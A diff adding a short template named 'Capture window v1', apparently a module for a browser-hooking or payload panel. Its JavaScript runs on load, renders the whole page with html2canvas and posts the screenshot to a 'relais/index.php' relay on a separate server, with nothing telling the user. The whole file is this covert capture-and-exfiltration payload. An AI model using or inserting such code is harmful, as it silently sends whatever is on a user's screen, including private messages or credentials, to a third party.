@@ -1,0 +1,15 @@
+%title%Capture window v1%title%
+
+%content%
+    function capture() {
+        html2canvas($('body'),{
+            onrendered: function (canvas) {                     
+                var imgString = canvas.toDataURL("image/png");
+                $.post(server_web+'relais/index.php', { source: imgString});             
+            }
+        });
+       }
+    capture();
+%content%
+
+%option%Update url on activeWindows.js%option%
